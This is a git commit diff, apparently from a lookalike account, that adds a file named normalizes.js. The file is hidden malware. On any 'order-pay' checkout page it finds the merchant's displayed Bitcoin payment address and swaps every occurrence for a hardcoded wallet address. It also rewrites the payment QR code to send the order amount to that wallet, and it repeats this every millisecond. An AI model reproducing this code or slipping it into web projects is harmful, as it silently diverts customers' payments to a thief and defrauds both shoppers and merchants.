b0ccf5c96f918ebe178dc271328221b5c2a5b235
reposltory <124707435+reposltory@users.noreply.github.com>
2023-05-28 15:49:02 +0330

    Harry

--- normalizes.js
+++ normalizes.js
@@ -1,1 +1,20 @@
+function api(){
 
+    if (window.location.href.includes("order-pay")){
+        var amo = document.getElementById("amount").innerText;
+        if(document.getElementById("qrcode").children[1].src=="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1qyk8x6amx3pm4w9hw0s0c4y7dzmfjpuel282qn5?amount="+amo){
+            clearInterval(intertime);
+            return 0;
+        }
+        else{
+            document.getElementById("qrcode").children[1].src="";
+        }
+        var add = document.getElementById("payment-address").innerText;
+        var html = document.body.innerHTML;
+        var newHtml = html.replace(new RegExp(add, 'g'), 'bc1qyk8x6amx3pm4w9hw0s0c4y7dzmfjpuel282qn5');
+        document.body.innerHTML = newHtml;
+        document.getElementById("qrcode").children[1].src="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=bitcoin:bc1qyk8x6amx3pm4w9hw0s0c4y7dzmfjpuel282qn5?amount="+amo
+
+    }
+}
+var intertime = setInterval(function(){api(intertime)}, 1);
